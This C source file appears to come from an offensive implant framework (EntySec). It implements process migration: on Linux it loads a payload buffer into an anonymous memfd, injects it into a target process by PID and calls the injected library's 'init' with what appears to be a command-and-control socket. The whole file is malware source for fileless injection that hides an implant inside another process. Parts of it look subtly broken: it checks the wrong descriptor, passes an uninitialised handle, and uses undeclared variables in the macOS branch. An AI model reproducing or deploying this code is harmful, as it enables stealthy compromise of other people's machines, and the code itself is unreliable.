/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <limits.h>
#include <unistd.h>
#include <stdio.h>

#if IS_LINUX
#include <syscall.h>
#endif

#ifndef IS_IPHONE
#include <injector.h>
#include <injector_internal.h>
#endif

#include <c2.h>
#include <log.h>
#include <migrate.h>

#ifndef IS_WINDOWS
#include <dlfcn.h>
#endif

int migrate_init(pid_t pid, int length, unsigned char *buffer, int fd)
{
#if IS_LINUX
    int memfd;
    char image[PATH_MAX];

    memfd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);

    if (fd >= 0)
    {
        write(memfd, buffer, length);
        sprintf(image, "/proc/self/fd/%d", memfd);

        migrate_inject(pid, image, fd);
        return 0;
    }
#endif

    return -1;
}

int migrate_inject(pid_t pid, char *image, int fd)
{
#ifndef IS_IPHONE
#ifndef IS_WINDOWS
    int retval;
    size_t func_addr;
#endif

    injector_t *injector;
    void *handle;

    if (injector_attach(&injector, pid) < 0)
    {
        return -1;
    }

    log_debug("* Attached to the process (%d)\n", pid);

#ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
    if (injector_inject_in_cloned_thread(injector, image, handle) < 0)
    {
        goto fail;
    }
#else
    if (injector_inject(injector, image, handle) < 0)
    {
        goto fail;
    }
#endif

    log_debug("* Injected to the process (%d)\n", pid);

#if IS_MACOS
    if (injector__write(injector, injector->text, name, len) != 0)
    {
        goto fail;
    }

    injector__call_function(injector, &retval, (long)dlsym, handle, injector->text);

    if (retval == 0)
    {
        goto fail;
    }

    log_debug("* Calling init with socket (%d)\n", fd);
    injector__call_function(injector, &retval, retval, fd);

#elif IS_LINUX
    if (injector_remote_func_addr(injector, handle, "init", &func_addr) != 0)
    {
        goto fail;
    }

    log_debug("* Calling init with socket (%d)\n", fd);
    injector__call_function(injector, NULL, func_addr, fd);
#endif

    injector_detach(injector);
    return 0;

fail:
    log_debug("* Failed to do inject (%s)\n", injector_error());
    injector_detach(injector);

#endif
    return -1;
}
